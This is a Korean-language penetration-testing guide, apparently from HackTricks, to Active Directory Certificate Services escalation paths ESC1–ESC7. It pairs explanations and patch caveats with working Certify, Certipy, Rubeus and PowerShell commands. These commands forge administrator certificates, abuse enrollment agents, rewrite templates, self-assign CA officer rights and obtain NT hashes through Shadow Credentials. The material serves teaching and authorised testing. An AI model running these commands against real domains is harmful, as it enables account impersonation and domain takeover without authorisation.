# AD CS 도메인 권한 상승

{{#include ../../../banners/hacktricks-training.md}}


**다음 게시물의 권한 상승 기법 섹션을 요약했습니다:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## 잘못 구성된 인증서 템플릿 - ESC1

### 설명

### 잘못 구성된 인증서 템플릿 - ESC1 설명

- **Enterprise CA가 낮은 권한의 사용자에게 등록 권한을 부여합니다.**
- **관리자 승인이 필요하지 않습니다.**
- **승인된 담당자의 서명이 필요하지 않습니다.**
- **인증서 템플릿의 보안 설명자가 지나치게 허용적으로 설정되어 있어, 낮은 권한의 사용자도 등록 권한을 얻을 수 있습니다.**
- **인증서 템플릿에 인증을 지원하는 EKU가 정의되어 있습니다:**
  - Client Authentication(OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication(1.3.6.1.5.2.3.4), Smart Card Logon(OID 1.3.6.1.4.1.311.20.2.2), Any Purpose(OID 2.5.29.37.0)와 같은 Extended Key Usage(EKU) 식별자 또는 EKU가 없는 경우(SubCA)가 포함됩니다.
- **템플릿에서 요청자가 Certificate Signing Request(CSR)에 subjectAltName을 포함하도록 허용합니다:**
  - Active Directory(AD)는 인증서에 subjectAltName(SAN)이 있으면 이를 우선적으로 사용해 신원을 확인합니다. 따라서 CSR에 SAN을 지정하면 모든 사용자(예: 도메인 관리자)를 사칭하는 인증서를 요청할 수 있습니다. 요청자가 SAN을 지정할 수 있는지는 인증서 템플릿의 AD 객체에 있는 `mspki-certificate-name-flag` 속성으로 확인할 수 있습니다. 이 속성은 비트마스크이며, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 플래그가 있으면 요청자가 SAN을 지정할 수 있습니다.

> [!CAUTION]
> 이러한 설정은 ESC1 템플릿 후보임을 나타낼 뿐, 사칭 경로가 완성되었음을 의미하지는 않습니다. 대상 주체가 해당 템플릿을 게시하는 CA에서 등록할 수 있는지, CA 등록이 허용되는지, 발급된 인증서가 인증 엔드포인트의 강력한 SID 매핑 규칙을 충족하는지 확인하세요. 현재 패치된 KDC는 인증서의 SID가 대상과 일치하지 않으면 요청된 UPN을 거부할 수 있습니다. 자세한 내용은 [Microsoft의 인증서 매핑 지침](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers)을 참조하세요.

**Domain Computers**에 등록 권한이 부여된 경우, 원래 사용자는 등록할 수 없더라도 준비된 컴퓨터 ID가 등록 대상이 될 수 있습니다. 컴퓨터 주체의 권한은 별도로 평가하세요. 요청을 보내기 전에 `msPKI-Minimal-Key-Size`를 확인하세요. 4096비트 RSA 키를 요구하는 템플릿은 클라이언트의 기본값인 2048비트 키를 거부합니다. 요청에 대상 SID를 지정하면 SID 불일치 문제를 해결할 수 있지만, 이는 CA와 KDC가 결과 인증서와 매핑을 허용하는 경우에만 가능합니다. 템플릿 플래그만으로도, Enroll ACE만으로도 이 조건이 충족된다고 단정할 수 없습니다.

이 기능은 제품이나 배포 서비스가 HTTPS 또는 호스트 인증서를 즉석에서 생성하도록 지원하기 위해, 또는 관련 지식이 부족해 활성화되는 경우가 있습니다.

이 옵션으로 인증서를 생성하면 경고가 표시됩니다. 하지만 기존 인증서 템플릿(예: `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`가 활성화된 `WebServer` 템플릿)을 복제한 뒤 인증 OID를 포함하도록 수정하는 경우에는 경고가 표시되지 않습니다.<sup>[[6]](#references)</sup>

### 악용

**취약한 인증서 템플릿을 찾으려면** 다음을 실행할 수 있습니다:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

**이 취약점을 악용해 관리자를 사칭하려면** 다음을 실행할 수 있습니다:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

그런 다음 생성된 **인증서를 `.pfx` 형식으로** 변환하고, Rubeus 또는 certipy를 사용해 다시 **인증할 수 있습니다**:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Windows 바이너리 "Certreq.exe" 및 "Certutil.exe"를 사용해 PFX를 생성할 수 있습니다: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest의 구성 스키마에서 인증서 템플릿을 열거하려면 다음 LDAP 쿼리를 실행하면 됩니다. 여기에는 승인이나 서명이 필요하지 않고, Client Authentication 또는 Smart Card Logon EKU를 보유하며, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 플래그가 활성화된 템플릿이 포함됩니다:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## 잘못 구성된 인증서 템플릿 - ESC2

### 설명

두 번째 악용 시나리오는 첫 번째 시나리오의 변형입니다.

1. Enterprise CA가 낮은 권한의 사용자에게 등록 권한을 부여합니다.
2. 관리자 승인 요구 사항이 비활성화되어 있습니다.
3. 권한 있는 서명 요구 사항이 생략되어 있습니다.
4. 인증서 템플릿의 지나치게 허용적인 보안 설명자가 낮은 권한의 사용자에게 인증서 등록 권한을 부여합니다.
5. **인증서 템플릿에 Any Purpose EKU가 포함되도록 정의되어 있거나 EKU가 없습니다.**

**Any Purpose EKU**를 사용하면 공격자는 클라이언트 인증, 서버 인증, 코드 서명 등을 포함한 **모든 목적**으로 인증서를 발급받을 수 있습니다. 이 시나리오를 악용할 때는 **ESC3에 사용되는 것과 동일한 기법**을 사용할 수 있습니다.

하위 CA 인증서 역할을 하는 **EKU가 없는** 인증서는 **모든 목적**으로 악용할 수 있으며, **새 인증서에 서명하는 데도 사용할 수 있습니다**. 따라서 공격자는 하위 CA 인증서를 활용해 새 인증서에 임의의 EKU나 필드를 지정할 수 있습니다.

하지만 하위 CA가 **`NTAuthCertificates`** 개체에서 신뢰되지 않는 경우, **도메인 인증**용으로 생성된 새 인증서는 작동하지 않습니다. 이것이 기본 설정입니다. 그렇더라도 공격자는 임의의 EKU와 인증서 값을 가진 **새 인증서를 생성**할 수 있습니다. 이러한 인증서는 다양한 목적으로 악용될 가능성이 있으며(예: 코드 서명, 서버 인증 등), SAML, AD FS, IPSec 같은 네트워크 내 다른 애플리케이션에 중대한 영향을 미칠 수 있습니다.<sup>[[6]](#references)</sup>

AD Forest의 구성 스키마에서 이 시나리오에 해당하는 템플릿을 열거하려면 다음 LDAP 쿼리를 실행할 수 있습니다:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## 잘못 구성된 Enrollment Agent Templates - ESC3

### 설명

이 시나리오는 첫 번째 및 두 번째 시나리오와 비슷하지만 **다른 EKU**(Certificate Request Agent)와 **서로 다른 2개의 template**를 악용합니다(따라서 요구 사항도 두 가지로 나뉩니다).

**Certificate Request Agent EKU**(OID 1.3.6.1.4.1.311.20.2.1)는 Microsoft 문서에서 **Enrollment Agent**라고 하며, principal이 **다른 사용자를 대신해** **인증서**를 **등록**할 수 있도록 합니다.

**“enrollment agent”**는 해당 **template**에 등록하고, 발급받은 **인증서를 사용해 다른 사용자를 대신하여 CSR에 공동 서명**합니다. 그런 다음 **공동 서명된 CSR**을 CA에 **보내고**, **“enroll on behalf of”를 허용하는 template**에 등록합니다. 그러면 CA는 **“다른” 사용자의 인증서**를 발급합니다.<sup>[[6]](#references)</sup>

**요구 사항 1:**

- Enterprise CA가 권한이 낮은 사용자에게 등록 권한을 부여합니다.
- 관리자 승인 요구 사항이 생략됩니다.
- 승인된 서명 요구 사항이 없습니다.
- 인증서 template의 보안 설명자가 지나치게 허용적으로 설정되어 권한이 낮은 사용자에게 등록 권한을 부여합니다.
- 인증서 template에 Certificate Request Agent EKU가 포함되어 있어, 다른 principal을 대신해 다른 인증서 template를 요청할 수 있습니다.

**요구 사항 2:**

- Enterprise CA가 권한이 낮은 사용자에게 등록 권한을 부여합니다.
- 관리자 승인을 우회할 수 있습니다.
- 버전 1 대상 template는 최신 세분화된 발급 정책 제어 없이도 enrollment agent를 허용할 수 있습니다. 버전 2 이상에서는 버전만으로 template를 제외하지 말고 애플리케이션 정책 발급 요구 사항과 승인된 서명을 확인하세요.
- 인증서 template에 정의된 EKU가 도메인 인증을 허용합니다.
- CA에 enrollment agent 제한이 적용되지 않습니다.

또한 대상 template는 선택한 CA에서 게시되어 있어야 하고, 대상 계정의 등록을 허용해야 하며, 의도한 도메인 인증 용도를 지원해야 합니다. 해당 계정에 필요한 subject/SAN 특성을 확인하세요. 예를 들어 AD에서 subject email을 구성하는 template는 필수 `mail` 값이 없는 계정에 인증서를 발급할 수 없습니다. Agent 인증서만으로는 이러한 대상 template 요건을 충족하지 못합니다.

### 악용

이 시나리오는 [**Certify**](https://github.com/GhostPack/Certify) 또는 [**Certipy**](https://github.com/ly4k/Certipy)를 사용해 악용할 수 있습니다:<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

**Enrollment Agent certificate**를 **발급받을 수 있는** **사용자**, **Enrollment Agent**가 발급할 수 있는 템플릿, 그리고 Enrollment Agent가 대신 작업할 수 있는 **계정**은 엔터프라이즈 CA에서 제한할 수 있습니다. 이를 설정하려면 `certsrc.msc` **스냅인**을 열고 **CA를 마우스 오른쪽 버튼으로 클릭**한 다음 **Properties**를 클릭하고 “Enrollment Agents” 탭으로 **이동**합니다.

하지만 CA의 **기본** 설정은 “**Do not restrict enrollment agents**”입니다. 관리자가 Enrollment Agent 제한을 활성화하고 “Restrict enrollment agents”로 설정해도 기본 구성은 여전히 매우 허용적입니다. 이 설정에서는 **Everyone**이 모든 템플릿에 대해 누구로든 인증서를 발급받을 수 있습니다.

### Windows 전용 PowerShell PoC와 Certi-Bhai

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai)는 Certify나 Certipy 없이 ESC1 및 ESC2/ESC3을 테스트합니다. 스크립트는 `X509Enrollment` COM API를 사용해 내보낼 수 있는 2048비트 RSA 키를 만들고, PKCS#10 요청을 구성하며, LDAP를 통해 첫 번째 `pKIEnrollmentService`를 찾습니다. 그런 다음 `CertificateAuthority.Request`로 요청을 제출하고, 응답을 `Cert:\CurrentUser\My`에 설치한 뒤, Base64로 인코딩된 PFX를 내보냅니다. ESC1 스크립트는 공격자가 선택한 UPN SAN(`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, 값 `0xb`)을 추가하는 반면, ESC2/ESC3 스크립트는 첫 번째 인증서를 사용해 대리 요청용 PKCS#7에 서명합니다.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

스크립트는 Rubeus에서 바로 사용할 수 있도록 개인 키가 포함된 **PFX**의 Base64를 출력합니다. 이를 `[Convert]::ToBase64String($cert.RawData)`로 대체하지 마세요. `RawData`는 공개 인증서만 인코딩하며 PKINIT 요청에 서명할 수 없습니다.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## 취약한 인증서 템플릿 액세스 제어 - ESC4

### **설명**

**인증서 템플릿**의 **보안 설명자**는 특정 **AD 주체**가 템플릿에 대해 보유한 **권한**을 정의합니다.

**공격자**가 **템플릿**을 **변경**하고 **이전 섹션**에서 설명한 **악용 가능한 잘못된 구성**을 적용하는 데 필요한 **권한**을 보유한 경우, 권한 상승이 가능할 수 있습니다.

인증서 템플릿에 적용되는 주요 권한은 다음과 같습니다:<sup>[[6]](#references)</sup>

- **Owner:** 객체를 암묵적으로 제어할 수 있어 모든 특성을 수정할 수 있습니다.
- **FullControl:** 모든 특성을 수정하는 기능을 포함해 객체에 대한 완전한 권한을 부여합니다.
- **WriteOwner:** 객체의 소유자를 공격자가 제어하는 주체로 변경할 수 있습니다.
- **WriteDacl:** 액세스 제어를 수정할 수 있어 공격자에게 FullControl을 부여할 수도 있습니다.
- **WriteProperty:** 객체의 모든 속성을 편집할 수 있습니다.

`CN=Certificate Templates,CN=Public Key Services,CN=Services,...` 컨테이너의 DACL도 검토하세요. [`pKICertificateTemplate` 클래스](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c)에 적용되는 `CreateChild` ACE 또는 광범위한 전체 제어 권한이 있으면 새 템플릿 객체를 만들 수 있습니다. [Microsoft 문서](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44)에 따르면 이 컨테이너에는 이러한 템플릿 객체가 저장됩니다. 생성을 시도하기 전에 해당하는 거부 ACE와 상속 설정을 검토하여 생성이 실제로 가능한지 확인하세요. 템플릿을 생성하는 것만으로는 인증서가 발급되지 않습니다. CA가 템플릿을 게시해야 하고, 요청 주체에 등록 권한이 있어야 하며, 인증서가 인증 엔드포인트에서 의도한 ID에 매핑되어야 합니다.

### 악용

Certify를 사용하여 템플릿과 다른 PKI 객체에 대한 편집 권한이 있는 주체를 열거합니다:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

이전 예시와 같은 privesc 사례입니다.

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4는 사용자가 certificate template에 대한 쓰기 권한을 가진 경우입니다. 예를 들어 certificate template의 구성을 덮어써서 해당 템플릿을 ESC1에 취약하게 만들 수 있습니다.

이미 신청자가 subject를 지정할 수 있지만 Server Authentication 용도로만 설정된 템플릿은 그 자체만으로는 사용자 로그온용 템플릿이 아닙니다. 유효한 템플릿 제어 권한이 있다면 공격자는 인증서를 요청하기 전에 인증 EKU 또는 application policy를 변경할 수 있습니다. [Microsoft 문서에서는 Smartcard Logon EKU의 로그인 용도를 설명합니다](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). CA가 수정된 템플릿을 게시하는지, 요청자에게 등록 권한이 있는지, 승인 및 서명 요구 사항이 충족되는지, 발급된 인증서가 의도한 계정에 매핑되는지 확인하세요. 특히 [Full Enforcement가 적용된 패치된 도메인 컨트롤러](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers)는 강력한 매핑이 없는 인증서를 거부합니다. 요청에 대상 UPN을 추가해도 이 요구 사항을 우회할 수 없습니다.

위 경로에서 볼 수 있듯이 이러한 권한은 `JOHNPC`만 가지고 있지만, 사용자 `JOHN`에게는 `JOHNPC`에 대한 새로운 `AddKeyCredentialLink` 엣지가 있습니다. 이 기법은 인증서와 관련되어 있으므로, 이 공격도 구현했으며 [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)로 알려져 있습니다.<sup>[[8]](#references)</sup> 피해자의 NT hash를 가져오는 Certipy의 `shadow auto` 명령을 살짝 살펴보겠습니다.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy**는 단일 명령으로 인증서 템플릿의 구성을 덮어쓸 수 있습니다. **기본적으로**, Certipy는 구성을 **ESC1에 취약하도록 덮어씁니다**. **`-save-old` 매개변수를 지정해 기존 구성을 저장할 수도 있으며**, 공격 후 구성을 **복원**할 때 유용합니다.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## 취약한 PKI 객체 액세스 제어 - ESC5

### 설명

인증서 템플릿과 인증 기관 외에도 여러 객체를 포함하는, ACL 기반 관계의 복잡한 연결망은 전체 AD CS 시스템의 보안에 영향을 미칠 수 있습니다. 보안에 중대한 영향을 미칠 수 있는 이러한 객체에는 다음이 포함됩니다.

- S4U2Self 또는 S4U2Proxy와 같은 메커니즘을 통해 손상될 수 있는 CA 서버의 AD 컴퓨터 객체.
- CA 서버의 RPC/DCOM 서버.
- 특정 컨테이너 경로 `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 내의 모든 하위 AD 객체 또는 컨테이너. 이 경로에는 Certificate Templates 컨테이너, Certification Authorities 컨테이너, NTAuthCertificates 객체, Enrollment Services Container 등이 포함되지만, 이에 국한되지는 않습니다.

권한이 낮은 공격자가 이러한 중요 구성 요소 중 하나라도 장악하면 PKI 시스템의 보안이 침해될 수 있습니다.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### 설명

[**CQure Academy 게시물**](https://cqureacademy.com/blog/enhanced-key-usage)에서 다루는 주제는 Microsoft에서 설명한 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 플래그의 영향도 다룹니다. Certification Authority(CA)에서 이 구성을 활성화하면 Active Directory®에서 생성된 요청을 포함해 **모든 요청**의 **subject alternative name**에 **사용자 정의 값**을 포함할 수 있습니다. 따라서 **권한이 없는** 사용자의 등록이 허용되는 기본 User 템플릿과 같이 도메인 **인증**에 사용하도록 구성된 **모든 템플릿**을 통해 **침입자**가 등록할 수 있습니다. 그 결과, 침입자는 도메인 관리자 또는 도메인 내의 **다른 활성 계정**으로 인증할 수 있는 인증서를 확보할 수 있습니다.<sup>[[9]](#references)</sup>

**참고**: `certreq.exe`의 `-attrib "SAN:"` 인수(“Name Value Pairs”라고 함)를 사용해 Certificate Signing Request(CSR)에 **alternative names**를 추가하는 방식은 ESC1에서 SAN을 악용하는 전략과 **다릅니다**. 차이는 **계정 정보가 인코딩되는 위치**에 있습니다. 여기서는 확장(extension)이 아니라 인증서 속성에 인코딩됩니다.

### 악용

이 설정이 활성화되어 있는지 확인하려면 조직에서 `certutil.exe`와 다음 명령을 사용할 수 있습니다.

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

이 작업은 본질적으로 **remote registry access**를 사용하므로, 대안적인 접근 방식은 다음과 같을 수 있습니다:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

[**Certify**](https://github.com/GhostPack/Certify) 및 [**Certipy**](https://github.com/ly4k/Certipy)와 같은 도구는 이 잘못된 구성을 탐지하고 악용할 수 있습니다:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

이러한 설정을 변경하려면, **도메인 관리자** 권한이나 이에 준하는 권한을 가진 경우, 모든 워크스테이션에서 다음 명령을 실행할 수 있습니다:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

환경에서 이 구성을 비활성화하려면 다음과 같이 플래그를 제거할 수 있습니다:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> 2022년 5월 보안 업데이트가 적용된 후 새로 발급되는 **certificates**에는 **요청자의 `objectSid` 속성**을 포함하는 **security extension**이 들어갑니다. ESC1의 경우 이 SID는 지정된 SAN에서 파생됩니다. 그러나 **ESC6**의 경우 SID는 SAN이 아니라 **요청자의 `objectSid`**를 반영합니다.\
> ESC6을 악용하려면 시스템이 ESC10(Weak Certificate Mappings)에 취약해야 합니다. ESC10은 **새 security extension보다 SAN을 우선시합니다**.

## 취약한 Certificate Authority 액세스 제어 - ESC7

### 공격 1

#### 설명

인증 기관의 액세스 제어는 CA 작업을 관리하는 일련의 권한으로 유지됩니다. `certsrv.msc`에 액세스하고 CA를 마우스 오른쪽 버튼으로 클릭한 다음 속성을 선택하고 Security 탭으로 이동하면 이러한 권한을 확인할 수 있습니다. 또한 다음과 같은 명령을 사용하여 PSPKI 모듈로 권한을 열거할 수 있습니다:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

이는 “CA administrator” 및 “Certificate Manager” 역할에 각각 해당하는 주요 권한인 **`ManageCA`**와 **`ManageCertificates`**에 대한 정보를 제공합니다.<sup>[[6]](#references)</sup>

#### 악용

인증 기관에 대한 **`ManageCA`** 권한이 있으면 PSPKI를 사용해 원격으로 설정을 조작할 수 있습니다. 여기에는 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 플래그를 활성화해 모든 템플릿에서 SAN 지정을 허용하는 작업이 포함되며, 이는 도메인 권한 상승의 핵심 요소입니다.

PSPKI의 **Enable-PolicyModuleFlag** cmdlet을 사용하면 이 프로세스를 간소화하고 GUI에서 직접 조작하지 않고도 설정을 수정할 수 있습니다.

**`ManageCertificates`** 권한이 있으면 보류 중인 요청을 승인할 수 있어 "CA certificate manager approval" 보호 기능을 사실상 우회할 수 있습니다.

**Certify**와 **PSPKI** 모듈을 함께 사용해 인증서를 요청하고, 승인한 뒤, 다운로드할 수 있습니다:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Attack 2

#### Explanation

> [!WARNING]
> **이전 공격**에서는 **ESC6 공격**을 수행하기 위해 **`Manage CA`** 권한으로 **EDITF_ATTRIBUTESUBJECTALTNAME2** 플래그를 **활성화**했지만, CA 서비스(`CertSvc`)를 다시 시작하기 전까지는 아무런 효과가 없습니다. 사용자에게 `Manage CA` 액세스 권한이 있으면 서비스도 **다시 시작할 수 있습니다**. 하지만 **사용자가 원격으로 서비스를 다시 시작할 수 있다는 뜻은 아닙니다**. 또한 2022년 5월 보안 업데이트로 인해 대부분의 패치된 환경에서는 E**SC6가 기본 설정 그대로 작동하지 않을 수 있습니다**.

따라서 여기서는 다른 공격을 소개합니다.

사전 요구 사항:

- **`ManageCA` 권한만 필요**
- **`Manage Certificates`** 권한(**`ManageCA`**를 통해 부여 가능)
- 인증서 템플릿 **`SubCA`**가 **활성화되어 있어야 함**(**`ManageCA`**를 통해 활성화 가능)

이 기법은 `Manage CA` _및_ `Manage Certificates` 액세스 권한이 있는 사용자가 **실패한 인증서 요청을 발급할 수 있다**는 점을 이용합니다. **`SubCA`** 인증서 템플릿은 **ESC1에 취약**하지만, **관리자만** 해당 템플릿에 등록할 수 있습니다. 따라서 **사용자**가 **`SubCA`** 등록을 **요청**하면 요청은 **거부**되지만, **나중에 관리자가 발급할 수 있습니다**.<sup>[[6]](#references)</sup>

#### Abuse

새로운 담당자로 사용자를 추가하면 **자신에게 `Manage Certificates`** 액세스 권한을 **부여할 수 있습니다**.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

**`SubCA`** 템플릿은 `-enable-template` 매개변수를 사용해 **CA에서 활성화할 수 있습니다**. 기본적으로 `SubCA` 템플릿은 활성화되어 있습니다.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

이 공격의 사전 요구 사항을 충족했다면, 먼저 **`SubCA` 템플릿을 기반으로 인증서를 요청**할 수 있습니다.

**이 요청은 거부됩니**다. 하지만 개인 키를 저장하고 요청 ID를 기록해 둡니다.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

**`Manage CA` 및 `Manage Certificates`** 권한으로 `ca` 명령과 `-issue-request <request ID>` 매개변수를 사용해 **실패한 인증서 요청을 발급**할 수 있습니다.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

그리고 마지막으로, `req` 명령과 `-retrieve <request ID>` 매개변수를 사용해 **발급된 인증서를 가져올 수 있습니다**.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### 설명

기존 ESC7 abuse(EDITF attribute 활성화 또는 pending request 승인)에 더해, **Certify 2.0**은 Enterprise CA의 *Manage Certificates*(일명 **Certificate Manager / Officer**) role만 있으면 가능한 완전히 새로운 primitive를 공개했습니다.<sup>[[3]](#references)</sup>

`ICertAdmin::SetExtension` RPC method는 *Manage Certificates*를 보유한 모든 principal이 실행할 수 있습니다. 이 method는 전통적으로 정상적인 CA가 **pending** request의 extension을 업데이트하는 데 사용했지만, 공격자는 이를 악용해 승인을 기다리는 request에 **기본값이 아닌(non-default) certificate extension**(예: `1.1.1.1` 같은 사용자 지정 *Certificate Issuance Policy* OID)을 **추가**할 수 있습니다.

대상 template이 해당 extension의 기본값을 **정의하지 않기 때문에**, request가 최종 발급될 때 CA는 공격자가 지정한 값을 덮어쓰지 않습니다. 따라서 발급된 certificate에는 공격자가 선택한 extension이 포함되며, 이를 통해 다음이 가능할 수 있습니다.

* 다른 취약한 template의 Application / Issuance Policy 요구 사항을 충족해 권한 상승으로 이어질 수 있습니다.
* 예상치 못한 trust를 certificate에 부여하는 EKU 또는 policy를 추가로 삽입할 수 있습니다.

